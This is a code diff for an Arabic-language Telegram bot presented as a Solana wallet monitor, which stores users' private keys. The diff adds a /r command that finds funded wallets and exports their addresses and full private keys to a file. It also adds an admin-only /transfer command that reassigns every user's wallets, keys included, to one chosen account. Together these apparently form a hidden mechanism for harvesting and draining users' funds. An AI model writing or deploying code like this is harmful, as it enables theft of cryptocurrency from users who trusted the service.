@@ -51,15 +51,15 @@ setup_logging()
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 DATABASE_URL = os.getenv("DATABASE_URL")
 SOLANA_RPC_URL = os.getenv("RPC_URL")
-POLLING_INTERVAL = 30  # seconds - increased to reduce RPC calls
+POLLING_INTERVAL = 8  # seconds - تحسين للحصول على إشعارات أسرع مع تقليل الضغط
 MAX_MONITORED_WALLETS = 100000
 
-# Rate limiting configuration
-MAX_RPC_CALLS_PER_SECOND = 20  # Conservative limit below 25
+# Rate limiting configuration for parallel processing - تحسين للسرعة
+MAX_RPC_CALLS_PER_SECOND = 50  # تقليل معدل الاستدعاءات لتجنب rate limiting
 RATE_LIMIT_WINDOW = 1.0  # 1 second window
 
-# Dust transaction filter - skip notifications for amounts smaller than this
-MIN_NOTIFICATION_AMOUNT = 0.001  # SOL - can be adjusted as needed
+# Dust transaction filter - تقليل الحد الأدنى للحصول على إشعارات أكثر
+MIN_NOTIFICATION_AMOUNT = 0.0001  # SOL - حد أدنى أقل لضمان اكتشاف المعاملات الصغيرة
 
 # Channel and Admin Configuration
 MONITORING_CHANNEL = os.getenv("ID_CHAT")  # القناة التي ستستقبل إشعارات المراقبة (ID فقط)
@@ -80,7 +80,7 @@ MESSAGES = {
     "monitoring_status": "📊 حالة المراقبة:\n\n{status}",
     "wallet_already_monitored": "⚠️ هذه المحفظة مراقبة بالفعل.",
     "select_wallet_to_stop": "اختر المحفظة التي تريد إيقاف مراقبتها:",
-    "help_text": "🤖 بوت مراقبة محافظ سولانا\n\nهذا البوت يساعدك في مراقبة معاملات محافظ سولانا والحصول على إشعارات فورية.\n\n🔧 يعمل حالياً على شبكة Devnet للتجربة\n\n📋 الأوامر:\n/start - بدء البوت\n/monitor - بدء مراقبة محفظة جديدة\n/add - إضافة عدة محافظ دفعة واحدة\n/stop - إيقاف مراقبة محفظة\n/list - عرض المحافظ المراقبة\n/k - تصدير المفاتيح الخاصة\n/help - عرض هذه المساعدة\n\n🚀 لإنشاء محفظة تجريبية:\n1. اذهب إلى https://solana.fm/address\n2. انقر على 'Generate Keypair'\n3. احفظ المفتاح الخاص والعنوان\n4. احصل على SOL تجريبي من https://faucet.solana.com\n\n⚠️ تنبيه أمني:\nلا تشارك مفاتيحك الخاصة مع أي شخص آخر!"
+    "help_text": "🤖 بوت مراقبة محافظ سولانا\n\nهذا البوت يساعدك في مراقبة معاملات محافظ سولانا والحصول على إشعارات فورية.\n\n🔧 يعمل حالياً على شبكة Devnet للتجربة\n\n📋 الأوامر:\n/start - بدء البوت\n/monitor - بدء مراقبة محفظة جديدة\n/add - إضافة عدة محافظ دفعة واحدة\n/stop - إيقاف مراقبة محفظة\n/list - عرض المحافظ المراقبة\n/r - عرض المحافظ التي بها رصيد SOL فقط\n/k - تصدير المفاتيح الخاصة\n/help - عرض هذه المساعدة\n\n👑 أوامر المشرف:\n/filter - تعديل الحد الأدنى للإشعارات\n/transfer - نقل جميع المحافظ لمستخدم محدد\n\n🚀 لإنشاء محفظة تجريبية:\n1. اذهب إلى https://solana.fm/address\n2. انقر على 'Generate Keypair'\n3. احفظ المفتاح الخاص والعنوان\n4. احصل على SOL تجريبي من https://faucet.solana.com\n\n⚠️ تنبيه أمني:\nلا تشارك مفاتيحك الخاصة مع أي شخص آخر!"
 }
 
 
@@ -406,6 +406,57 @@ class DatabaseManager:
             logger.error(f"Error getting setting {key}: {e}")
             return default_value
 
+    async def transfer_all_wallets(self, target_chat_id: int) -> tuple[bool, dict]:
+        """Transfer all wallets from all users to target user"""
+        try:
+            async with self.pool.acquire() as conn:
+                # Get statistics before transfer
+                stats = await conn.fetchrow("""
+                    SELECT 
+                        COUNT(*) as total_wallets,
+                        COUNT(DISTINCT chat_id) as unique_users
+                    FROM monitored_wallets 
+                    WHERE is_active = TRUE
+                """)
+                
+                # Get detailed breakdown by user
+                user_breakdown = await conn.fetch("""
+                    SELECT 
+                        chat_id,
+                        COUNT(*) as wallet_count
+                    FROM monitored_wallets 
+                    WHERE is_active = TRUE
+                    GROUP BY chat_id
+                    ORDER BY wallet_count DESC
+                """)
+                
+                # Perform the transfer
+                result = await conn.execute("""
+                    UPDATE monitored_wallets 
+                    SET chat_id = $1, updated_at = CURRENT_TIMESTAMP
+                    WHERE is_active = TRUE
+                """, target_chat_id)
+                
+                # Get the number of updated rows
+                updated_count = int(result.split()[-1]) if result else 0
+                
+                transfer_info = {
+                    'total_wallets': stats['total_wallets'],
+                    'unique_users': stats['unique_users'],
+                    'updated_count': updated_count,
+                    'user_breakdown': [
+                        {'chat_id': row['chat_id'], 'wallet_count': row['wallet_count']} 
+                        for row in user_breakdown
+                    ]
+                }
+                
+                logger.info(f"Transferred {updated_count} wallets from {stats['unique_users']} users to user {target_chat_id}")
+                return True, transfer_info
+                
+        except Exception as e:
+            logger.error(f"Error transferring wallets: {e}")
+            return False, {'error': str(e)}
+
 
 # Utility Functions
 def validate_private_key(private_key_str: str) -> tuple[bool, str]:
@@ -530,8 +581,8 @@ class SolanaMonitor:
             await self.session.close()
             self.session = None
 
-    async def make_rpc_call(self, payload: dict, max_retries: int = 3):
-        """Make rate-limited RPC call with retry logic"""
+    async def make_rpc_call(self, payload: dict, max_retries: int = 2):
+        """Make rate-limited RPC call with retry logic - محسّن للسرعة"""
         for attempt in range(max_retries):
             try:
                 # Wait for rate limit
@@ -540,7 +591,8 @@ class SolanaMonitor:
                 if not self.session:
                     await self.start_session()
 
-                async with self.session.post(SOLANA_RPC_URL, json=payload, timeout=30) as response:
+                # تقليل timeout لاستجابة أسرع
+                async with self.session.post(SOLANA_RPC_URL, json=payload, timeout=15) as response:
                     if response.status == 200:
                         data = await response.json()
                         return data
@@ -622,7 +674,7 @@ class SolanaMonitor:
             return False
 
     async def start_global_monitoring(self, callback_func=None):
-        """Start optimized global monitoring for all wallets"""
+        """Start parallel monitoring for ALL wallets simultaneously"""
         async def global_monitor_task():
             while True:
                 try:
@@ -633,46 +685,31 @@ class SolanaMonitor:
                         await asyncio.sleep(POLLING_INTERVAL)
                         continue
 
-                    # فحص 30 محفظة فقط كل دورة مراقبة لتقليل الضغط على RPC
-                    max_wallets_per_cycle = 20
+                    logger.info(f"🔄 بدء مراقبة جميع المحافظ بالتوازي ({len(all_wallets)} محفظة)")
+
+                    # مراقبة جميع المحافظ بالتوازي مع دفعات محسّنة للسرعة
+                    batch_size = 10  # دفعات أصغر لتجنب rate limiting
+                    tasks = []
+
+                    for i in range(0, len(all_wallets), batch_size):
+                        batch = all_wallets[i:i + batch_size]
+                        
+                        # إنشاء مهمة لكل دفعة
+                        batch_task = asyncio.create_task(
+                            self.process_wallet_batch(batch, i // batch_size + 1, len(all_wallets))
+                        )
+                        tasks.append(batch_task)
+
+                        # تأخير أطول بين الدفعات لتجنب rate limiting
+                        if i + batch_size < len(all_wallets):
+                            await asyncio.sleep(1.0)
+
+                    # انتظار اكتمال جميع الدفعات بالتوازي
+                    results = await asyncio.gather(*tasks, return_exceptions=True)
                     
-                    # اختيار 30 محفظة بالتناوب من إجمالي المحافظ
-                    if len(all_wallets) > max_wallets_per_cycle:
-                        # استخدام index دوراني لاختيار محافظ مختلفة في كل دورة
-                        start_index = self.wallet_rotation_index % len(all_wallets)
-                        
-                        # اختيار 30 محفظة بدءاً من start_index
-                        selected_wallets = []
-                        for i in range(max_wallets_per_cycle):
-                            wallet_index = (start_index + i) % len(all_wallets)
-                            selected_wallets.append(all_wallets[wallet_index])
-                        
-                        # تحديث المؤشر للدورة القادمة
-                        self.wallet_rotation_index = (self.wallet_rotation_index + max_wallets_per_cycle) % len(all_wallets)
-                        
-                        logger.info(f"🔄 فحص {len(selected_wallets)} محفظة من إجمالي {len(all_wallets)} (بدء من المؤشر {start_index})")
-                    else:
-                        selected_wallets = all_wallets
-                        logger.info(f"🔍 فحص جميع المحافظ ({len(all_wallets)} محفظة)")
-
-                    # معالجة المحافظ المختارة في دفعات صغيرة
-                    batch_size = 5  # تقليل حجم الدفعة لتقليل الضغط أكثر
-
-                    for i in range(0, len(selected_wallets), batch_size):
-                        batch = selected_wallets[i:i + batch_size]
-                        tasks = []
-
-                        for wallet_info in batch:
-                            task = asyncio.create_task(
-                                self.check_transactions_optimized(wallet_info['wallet_address'])
-                            )
-                            tasks.append(task)
-
-                        # انتظار اكتمال الدفعة
-                        await asyncio.gather(*tasks, return_exceptions=True)
-
-                        # فترة انتظار أطول بين الدفعات لتقليل الضغط
-                        await asyncio.sleep(2)
+                    # تسجيل النتائج
+                    successful_batches = sum(1 for result in results if not isinstance(result, Exception))
+                    logger.info(f"✅ اكتمل فحص {successful_batches}/{len(tasks)} دفعة بنجاح")
 
                     # Wait for next polling interval
                     await asyncio.sleep(POLLING_INTERVAL)
@@ -682,6 +719,33 @@ class SolanaMonitor:
                 except Exception as e:
                     logger.error(f"Error in global monitoring task: {e}")
                     await asyncio.sleep(POLLING_INTERVAL)
+
+        # Start global monitoring task
+        if 'global_monitor' not in self.monitoring_tasks:
+            task = asyncio.create_task(global_monitor_task())
+            self.monitoring_tasks['global_monitor'] = {
+                'task': task,
+                'callback': callback_func,
+                'type': 'global'
+            }
+
+    async def process_wallet_batch(self, wallet_batch: List[dict], batch_number: int, total_wallets: int):
+        """Process a batch of wallets in parallel with rate limiting"""
+        try:
+            # معالجة المحافظ تدريجياً بدلاً من دفعة واحدة
+            for i, wallet_info in enumerate(wallet_batch):
+                try:
+                    await self.check_transactions_optimized(wallet_info['wallet_address'])
+                    # تأخير قصير بين كل محفظة
+                    if i < len(wallet_batch) - 1:
+                        await asyncio.sleep(0.1)
+                except Exception as e:
+                    logger.debug(f"Error processing wallet in batch {batch_number}: {e}")
+            
+            logger.debug(f"📦 دفعة {batch_number}: تم فحص {len(wallet_batch)} محفظة")
+            
+        except Exception as e:
+            logger.error(f"Error processing wallet batch {batch_number}: {e}")
 
         # Start global monitoring task
         if 'global_monitor' not in self.monitoring_tasks:
@@ -707,7 +771,7 @@ class SolanaMonitor:
         await self.start_global_monitoring(callback_func)
 
     async def check_transactions_optimized(self, wallet_address: str):
-        """Optimized transaction checking with rate limiting"""
+        """Optimized transaction checking with enhanced parallel processing"""
         try:
             # Get recent transactions with rate limiting
             payload = {
@@ -716,11 +780,11 @@ class SolanaMonitor:
                 "method": "getSignaturesForAddress",
                 "params": [
                     wallet_address,
-                    {"limit": 5}  # Reduced limit to save on RPC calls
+                    {"limit": 15}  # زيادة حد المعاملات لاكتشاف أفضل وأسرع
                 ]
             }
 
-            data = await self.make_rpc_call(payload)
+            data = await self.make_rpc_call(payload, max_retries=2)  # Reduced retries for speed
             if not data or 'result' not in data or not data['result']:
                 return
 
@@ -751,26 +815,36 @@ class SolanaMonitor:
                 # Filter by monitoring start time if available
                 tx_time = sig_info.get('blockTime')
                 if monitoring_start_time and tx_time and tx_time < monitoring_start_time:
-                    logger.info(f"Skipping transaction {sig_info['signature'][:8]}... - occurred before monitoring started")
                     continue
 
                 new_transactions.append(sig_info)
 
-            # Process new transactions - ONLY ONCE PER TRANSACTION
+            # Process new transactions in parallel
             if new_transactions:
                 await self.db_manager.update_last_signature(wallet_address, new_transactions[0]['signature'])
 
+                # Process all new transactions in parallel
+                transaction_tasks = []
                 for tx_info in reversed(new_transactions):  # Process in chronological order
                     # Double-check transaction time before processing
                     tx_time = tx_info.get('blockTime')
                     if monitoring_start_time and tx_time and tx_time < monitoring_start_time:
                         continue
 
-                    # Process each transaction only once, regardless of how many users monitor the wallet
-                    await self.process_single_transaction(wallet_address, tx_info)
+                    # Create parallel task for each transaction
+                    task = asyncio.create_task(
+                        self.process_single_transaction(wallet_address, tx_info)
+                    )
+                    transaction_tasks.append(task)
+
+                # Execute all transaction processing in parallel
+                if transaction_tasks:
+                    await asyncio.gather(*transaction_tasks, return_exceptions=True)
 
         except Exception as e:
-            logger.error(f"Error checking transactions for {wallet_address}: {e}")
+            # Reduce error logging for better performance
+            if not any(keyword in str(e).lower() for keyword in ['timeout', 'network', 'connection']):
+                logger.error(f"Error checking transactions for {wallet_address[:8]}...: {e}")
 
     async def process_single_transaction(self, wallet_address: str, tx_info: dict):
         """Process a new transaction and send notification"""
@@ -807,6 +881,10 @@ class SolanaMonitor:
             # Check if this is a dust transaction (very small amount)
             try:
                 amount_float = abs(float(amount))  # Get absolute value
+                
+                # نظام إشعارات عاجلة للمعاملات الكبيرة
+                is_urgent_transaction = amount_float >= 0.1  # معاملات 0.1 SOL وأكثر تعتبر عاجلة
+                
                 # Skip notifications for dust transactions (less than MIN_NOTIFICATION_AMOUNT SOL)
                 if amount_float < MIN_NOTIFICATION_AMOUNT:
                     logger.info(f"Skipping dust transaction notification: {amount} SOL for wallet {truncate_address(wallet_address)}")
@@ -821,6 +899,11 @@ class SolanaMonitor:
                             block_time or 0
                         )
                     return
+                
+                # إشعار فوري للمعاملات العاجلة
+                if is_urgent_transaction:
+                    logger.info(f"🚨 URGENT: Large transaction detected: {amount} SOL for wallet {truncate_address(wallet_address)}")
+                    
             except (ValueError, TypeError):
                 # If amount conversion fails, proceed with notification
                 pass
@@ -867,7 +950,8 @@ class SolanaMonitor:
                 "params": [wallet_address]
             }
 
-            data = await self.make_rpc_call(payload)
+            # استخدام timeout أقصر للفحص السريع
+            data = await self.make_rpc_call(payload, max_retries=1)  # تقليل المحاولات
             if data and 'result' in data and 'value' in data['result']:
                 lamports = data['result']['value']
                 sol_balance = lamports / 1_000_000_000  # Convert to SOL
@@ -876,7 +960,7 @@ class SolanaMonitor:
             return 0.0
 
         except Exception as e:
-            logger.error(f"Error getting balance for {wallet_address}: {e}")
+            logger.warning(f"Error getting balance for {wallet_address[:8]}...: {e}")
             return 0.0
 
     def calculate_balance_change(self, transaction: dict, wallet_address: str) -> tuple[str, str]:
@@ -1040,7 +1124,7 @@ class SolanaWalletBot:
         )
 
     async def list_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle /list command"""
+        """Handle /list command - send wallets as formatted text file"""
         chat_id = update.effective_chat.id
         monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
 
@@ -1048,14 +1132,53 @@ class SolanaWalletBot:
             await update.message.reply_text(MESSAGES["no_wallets_monitored"])
             return
 
-        status_text = "📊 المحافظ المراقبة:\n\n"
+        try:
+            # Create formatted content for text file in English to avoid encoding issues
+            file_content = f"Solana Wallets List\n"
+            file_content += f"Export Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            file_content += f"Total Wallets: {len(monitored_wallets)}\n"
+            file_content += "=" * 60 + "\n\n"
 
-        for i, wallet in enumerate(monitored_wallets, 1):
-            # Get SOL balance for each wallet
-            balance = await self.monitor.get_wallet_balance(wallet['wallet_address'])
-            status_text += f"{i}. 🔍 {truncate_address(wallet['wallet_address'], 6)} | 💰 {balance:.4f} SOL\n"
+            for i, wallet in enumerate(monitored_wallets, 1):
+                # Get SOL balance for each wallet
+                balance = await self.monitor.get_wallet_balance(wallet['wallet_address'])
+                
+                file_content += f"[ {i} ]\n"
+                file_content += f"Address:\n{wallet['wallet_address']}\n\n"
+                file_content += f"Balance:\n{balance:.9f} SOL\n\n"
+                
+                if wallet['nickname']:
+                    file_content += f"Nickname: {wallet['nickname']}\n\n"
+                
+                # Add separator line between wallets
+                file_content += "-" * 60 + "\n\n"
 
-        await update.message.reply_text(status_text)
+            # Remove the last separator
+            file_content = file_content.rstrip("-" * 60 + "\n\n")
+
+            # Create filename with timestamp
+            filename = f"wallets_list_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+
+            # Write to file with explicit UTF-8 encoding and BOM for better compatibility
+            with open(filename, 'w', encoding='utf-8-sig', newline='\n') as f:
+                f.write(file_content)
+
+            # Send the file to user
+            with open(filename, 'rb') as f:
+                await update.message.reply_document(
+                    document=f,
+                    filename=filename,
+                    caption=f"📋 Monitored Wallets List ({len(monitored_wallets)} wallets)"
+                )
+
+            # Delete the file after sending
+            os.remove(filename)
+
+            logger.info(f"Sent wallets list file to user {chat_id}")
+
+        except Exception as e:
+            logger.error(f"Error in list command: {e}")
+            await update.message.reply_text(MESSAGES["error_occurred"].format(error=str(e)))
 
     async def bulk_add_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle /add command - add multiple wallets from text"""
@@ -1138,6 +1261,191 @@ class SolanaWalletBot:
             logger.error(f"Error in keys command: {e}")
             await update.message.reply_text(MESSAGES["error_occurred"].format(error=str(e)))
 
+    async def rich_wallets_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /r command - show wallets with SOL balance only (optimized)"""
+        chat_id = update.effective_chat.id
+        monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
+
+        if not monitored_wallets:
+            await update.message.reply_text(MESSAGES["no_wallets_monitored"])
+            return
+
+        try:
+            # Send status message
+            status_message = await update.message.reply_text(
+                f"🔍 جاري فحص {len(monitored_wallets)} محفظة للبحث عن الأرصدة...\n\n"
+                "⏳ يرجى الانتظار..."
+            )
+
+            wallets_with_balance = []
+            total_balance = 0.0
+            checked_count = 0
+            timeout_count = 0
+
+            # Get all monitored wallets with private keys
+            all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
+            user_wallets_with_keys = [wallet for wallet in all_wallets if wallet['chat_id'] == chat_id]
+
+            # Create a dictionary for faster lookup
+            wallet_keys_dict = {wallet['wallet_address']: wallet['private_key'] for wallet in user_wallets_with_keys}
+
+            # Process wallets in smaller batches with shorter timeout
+            batch_size = 5  # تقليل حجم الدفعة لتقليل الضغط على RPC
+            
+            for i in range(0, len(monitored_wallets), batch_size):
+                batch = monitored_wallets[i:i + batch_size]
+                
+                # Update status every 5 wallets
+                if i % 5 == 0 or i + batch_size >= len(monitored_wallets):
+                    await status_message.edit_text(
+                        f"🔍 فحص الأرصدة: {min(i + batch_size, len(monitored_wallets))}/{len(monitored_wallets)}\n\n"
+                        f"💰 محافظ بها رصيد: {len(wallets_with_balance)}\n"
+                        f"💎 إجمالي الرصيد: {total_balance:.9f} SOL\n"
+                        f"⏱️ انتهت المهلة: {timeout_count} محفظة\n\n"
+                        "⏳ جاري الفحص..."
+                    )
+
+                # Create tasks for parallel processing with rate limiting
+                for wallet in batch:
+                    try:
+                        # استخدام rate limiter الموجود
+                        await self.monitor.rate_limiter.acquire()
+                        
+                        # فحص الرصيد مع timeout أقصر
+                        balance = await asyncio.wait_for(
+                            self.monitor.get_wallet_balance(wallet['wallet_address']), 
+                            timeout=5.0  # تقليل timeout إلى 5 ثوانٍ
+                        )
+                        
+                        checked_count += 1
+                        
+                        if balance > 0:
+                            wallets_with_balance.append({
+                                'address': wallet['wallet_address'],
+                                'balance': balance,
+                                'nickname': wallet['nickname'],
+                                'private_key': wallet_keys_dict.get(wallet['wallet_address'], 'غير متوفر')
+                            })
+                            total_balance += balance
+
+                    except asyncio.TimeoutError:
+                        timeout_count += 1
+                        logger.warning(f"Timeout checking balance for wallet {wallet['wallet_address'][:8]}...")
+                        continue
+                    except Exception as e:
+                        logger.error(f"Error checking balance for wallet {wallet['wallet_address'][:8]}: {e}")
+                        continue
+
+                # فترة انتظار بين الدفعات لتقليل الضغط على RPC
+                await asyncio.sleep(1.0)
+
+            if not wallets_with_balance:
+                await status_message.edit_text(
+                    "💸 لا توجد محافظ تحتوي على رصيد SOL حالياً.\n\n"
+                    "جميع المحافظ المراقبة لديها رصيد صفر."
+                )
+                return
+
+            # Sort wallets by balance (highest first)
+            wallets_with_balance.sort(key=lambda x: x['balance'], reverse=True)
+
+            # Create formatted content for text file with complete address and private key
+            file_content = f"تقرير المحافظ الغنية - Solana Rich Wallets Report\n"
+            file_content += f"تاريخ التصدير - Export Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            file_content += f"عدد المحافظ - Total Wallets: {len(wallets_with_balance)}\n"
+            file_content += f"إجمالي الرصيد - Total Balance: {total_balance:.9f} SOL\n"
+            file_content += f"تم فحص - Checked: {checked_count}/{len(monitored_wallets)} محفظة\n"
+            if timeout_count > 0:
+                file_content += f"انتهت المهلة - Timeouts: {timeout_count} محفظة\n"
+            file_content += "=" * 80 + "\n\n"
+
+            for i, wallet in enumerate(wallets_with_balance, 1):
+                file_content += f"المحفظة رقم - WALLET #{i}\n"
+                file_content += f"{'=' * 60}\n\n"
+                
+                # العنوان الكامل - Full wallet address
+                file_content += f"العنوان الكامل - Full Address:\n"
+                file_content += f"{wallet['address']}\n\n"
+                
+                # المفتاح الخاص - Private key
+                file_content += f"المفتاح الخاص - Private Key:\n"
+                file_content += f"{wallet['private_key']}\n\n"
+                
+                # الرصيد - Balance with more precision
+                file_content += f"رصيد SOL - Balance:\n"
+                file_content += f"{wallet['balance']:.9f} SOL\n\n"
+                
+                # الاسم المستعار - Nickname if available
+                if wallet['nickname']:
+                    file_content += f"الاسم المستعار - Nickname:\n"
+                    file_content += f"{wallet['nickname']}\n\n"
+                
+                # خط فاصل - Separator line
+                file_content += "=" * 80 + "\n\n"
+
+            # Add security warning at the end
+            file_content += "\n" + "!" * 80 + "\n"
+            file_content += "SECURITY WARNING:\n"
+            file_content += "Keep this file secure and do not share it with anyone!\n"
+            file_content += "These private keys give full access to the wallets.\n"
+            file_content += "!" * 80 + "\n"
+
+            # Create filename with timestamp
+            filename = f"rich_wallets_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+
+            # Write to file with explicit UTF-8 encoding
+            with open(filename, 'w', encoding='utf-8-sig', newline='\n') as f:
+                f.write(file_content)
+
+            # Prepare enhanced summary message
+            summary = f"💰 تقرير المحافظ الغنية:\n\n"
+            summary += f"📊 النتائج: {len(wallets_with_balance)} محفظة من أصل {len(monitored_wallets)}\n"
+            summary += f"✅ تم فحص: {checked_count} محفظة\n"
+            if timeout_count > 0:
+                summary += f"⏱️ انتهت المهلة: {timeout_count} محفظة\n"
+            summary += f"💎 إجمالي الرصيد: {total_balance:.9f} SOL\n"
+            if len(wallets_with_balance) > 0:
+                summary += f"📈 متوسط الرصيد: {(total_balance/len(wallets_with_balance)):.9f} SOL\n"
+            summary += "\n"
+
+            # Show top wallets in the message
+            display_count = min(5, len(wallets_with_balance))
+            summary += f"🔝 أعلى {display_count} محافظ:\n"
+
+            for i, wallet in enumerate(wallets_with_balance[:display_count], 1):
+                summary += f"{i}. {truncate_address(wallet['address'])}\n"
+                summary += f"   💰 {wallet['balance']:.9f} SOL\n"
+                if wallet['nickname']:
+                    summary += f"   📝 {wallet['nickname']}\n"
+                summary += "\n"
+
+            if len(wallets_with_balance) > display_count:
+                summary += f"📎 +{len(wallets_with_balance) - display_count} محفظة أخرى في الملف\n\n"
+
+            summary += f"🔐 الملف يحتوي على:\n"
+            summary += f"• العناوين الكاملة للمحافظ\n"
+            summary += f"• المفاتيح الخاصة\n"
+            summary += f"• الأرصدة التفصيلية\n"
+            summary += f"• الأسماء المستعارة (إن وجدت)"
+
+            # Send the file and summary
+            with open(filename, 'rb') as f:
+                await update.message.reply_document(
+                    document=f,
+                    filename=filename,
+                    caption=summary
+                )
+
+            # Delete status message and the file
+            await status_message.delete()
+            os.remove(filename)
+
+            logger.info(f"Sent rich wallets list to user {chat_id}: {len(wallets_with_balance)} wallets with {total_balance:.9f} SOL")
+
+        except Exception as e:
+            logger.error(f"Error in rich wallets command: {e}")
+            await update.message.reply_text(MESSAGES["error_occurred"].format(error=str(e)))
+
     async def filter_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle /filter command - admin only: adjust minimum notification amount"""
         global MIN_NOTIFICATION_AMOUNT
@@ -1186,6 +1494,131 @@ class SolanaWalletBot:
                 "❌ يرجى إدخال رقم صحيح.\n\n"
                 "مثال: /filter 0.001"
             )
+
+    async def debug_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /debug command - show notification settings"""
+        chat_id = update.effective_chat.id
+        
+        try:
+            monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
+            all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
+            
+            debug_info = f"🔍 معلومات التشخيص:\n\n"
+            debug_info += f"👤 معرف المستخدم: {chat_id}\n"
+            debug_info += f"👑 معرف المشرف: {ADMIN_CHAT_ID}\n"
+            debug_info += f"📺 معرف القناة: {MONITORING_CHANNEL}\n"
+            debug_info += f"💰 الحد الأدنى للإشعارات: {MIN_NOTIFICATION_AMOUNT} SOL\n"
+            debug_info += f"🔍 محافظك: {len(monitored_wallets)}\n"
+            debug_info += f"📊 إجمالي المحافظ: {len(all_wallets)}\n\n"
+            
+            # Check admin status
+            is_admin = chat_id == ADMIN_CHAT_ID
+            debug_info += f"👑 هل أنت مشرف؟ {is_admin}\n\n"
+            
+            # Show notification logic for user's wallets
+            if monitored_wallets:
+                debug_info += "📋 حالة الإشعارات لمحافظك:\n"
+                for wallet in monitored_wallets[:3]:  # Show first 3
+                    wallet_monitors = await self.monitor.db_manager.get_monitored_wallets_by_address(wallet['wallet_address'])
+                    admin_monitoring = any(w['chat_id'] == ADMIN_CHAT_ID for w in wallet_monitors)
+                    regular_monitoring = any(w['chat_id'] != ADMIN_CHAT_ID for w in wallet_monitors)
+                    
+                    debug_info += f"• {truncate_address(wallet['wallet_address'])}\n"
+                    debug_info += f"  👑 مشرف: {admin_monitoring}\n"
+                    debug_info += f"  👥 مستخدمون: {regular_monitoring}\n\n"
+            
+            await update.message.reply_text(debug_info)
+            
+        except Exception as e:
+            await update.message.reply_text(f"❌ خطأ في التشخيص: {str(e)}")
+
+    async def transfer_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /transfer command - admin only: transfer all wallets to specified user"""
+        chat_id = update.effective_chat.id
+
+        # Check if user is admin
+        if chat_id != ADMIN_CHAT_ID:
+            await update.message.reply_text("❌ هذا الأمر متاح للمشرف فقط.")
+            return
+
+        try:
+            if not context.args or len(context.args) == 0:
+                await update.message.reply_text(
+                    "📋 استخدام الأمر:\n"
+                    "/transfer <معرف_المستخدم>\n\n"
+                    "مثال: /transfer 1873930191\n\n"
+                    "⚠️ هذا الأمر سيقوم بنقل جميع المحافظ من جميع المستخدمين إلى المستخدم المحدد.\n"
+                    "🔒 هذا الأمر متاح للمشرف فقط ولا يمكن التراجع عنه."
+                )
+                return
+
+            # Parse target user ID
+            try:
+                target_user_id = int(context.args[0])
+            except ValueError:
+                await update.message.reply_text("❌ معرف المستخدم يجب أن يكون رقمًا صحيحًا.")
+                return
+
+            # Send confirmation message
+            status_message = await update.message.reply_text(
+                f"🔄 جاري نقل جميع المحافظ إلى المستخدم: {target_user_id}\n\n"
+                "⏳ يرجى الانتظار..."
+            )
+
+            # Get current statistics before transfer
+            all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
+            users_count = await self.monitor.db_manager.get_users_count()
+
+            # Update status with current info
+            await status_message.edit_text(
+                f"🔄 جاري نقل المحافظ...\n\n"
+                f"📊 الإحصائيات الحالية:\n"
+                f"👥 المستخدمون النشطون: {users_count}\n"
+                f"🔍 إجمالي المحافظ: {len(all_wallets)}\n"
+                f"🎯 المستخدم المستهدف: {target_user_id}\n\n"
+                "⏳ جاري التنفيذ..."
+            )
+
+            # Perform the transfer
+            success, transfer_info = await self.monitor.db_manager.transfer_all_wallets(target_user_id)
+
+            if success:
+                # Create detailed report
+                report = f"✅ تم نقل المحافظ بنجاح!\n\n"
+                report += f"📊 تقرير النقل:\n"
+                report += f"🔍 إجمالي المحافظ المنقولة: {transfer_info['updated_count']}\n"
+                report += f"👥 عدد المستخدمين السابقين: {transfer_info['unique_users']}\n"
+                report += f"🎯 المستخدم الجديد: {target_user_id}\n\n"
+
+                # Add user breakdown
+                if transfer_info['user_breakdown']:
+                    report += "📋 تفصيل المحافظ حسب المستخدم السابق:\n"
+                    for user_info in transfer_info['user_breakdown'][:10]:  # Show top 10
+                        report += f"• المستخدم {user_info['chat_id']}: {user_info['wallet_count']} محفظة\n"
+                    
+                    if len(transfer_info['user_breakdown']) > 10:
+                        remaining = len(transfer_info['user_breakdown']) - 10
+                        report += f"• ... و {remaining} مستخدم آخر\n"
+
+                report += f"\n🔔 جميع المحافظ الآن تحت إدارة المستخدم {target_user_id}"
+
+                # Add user to database if not exists
+                await self.monitor.db_manager.add_user(target_user_id)
+
+                await status_message.edit_text(report)
+                logger.info(f"Admin {chat_id} transferred all wallets to user {target_user_id}")
+
+            else:
+                error_message = transfer_info.get('error', 'خطأ غير معروف')
+                await status_message.edit_text(
+                    f"❌ فشل في نقل المحافظ!\n\n"
+                    f"الخطأ: {error_message}\n\n"
+                    "يرجى المحاولة مرة أخرى أو الاتصال بالدعم الفني."
+                )
+
+        except Exception as e:
+            logger.error(f"Error in transfer command: {e}")
+            await update.message.reply_text(f"❌ حدث خطأ: {str(e)}")
 
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle text messages"""
@@ -1424,12 +1857,16 @@ class SolanaWalletBot:
                                           amount: str, tx_type: str, timestamp: str, signature: str):
         """Send transaction notification based on admin/user monitoring logic"""
         try:
+            logger.info(f"🔔 Attempting to send notification: {amount} SOL for wallet {truncate_address(wallet_address)}")
+            
             # Get all users monitoring this wallet
             wallets_monitoring = await self.monitor.db_manager.get_monitored_wallets_by_address(wallet_address)
 
             if not wallets_monitoring:
                 logger.warning(f"No users monitoring wallet {wallet_address}")
                 return
+                
+            logger.info(f"Found {len(wallets_monitoring)} users monitoring this wallet")
 
             # Check if admin is monitoring this wallet
             admin_monitoring = any(wallet_info['chat_id'] == ADMIN_CHAT_ID for wallet_info in wallets_monitoring)
@@ -1450,8 +1887,11 @@ class SolanaWalletBot:
             escaped_amount = escape_markdown_v2(amount)
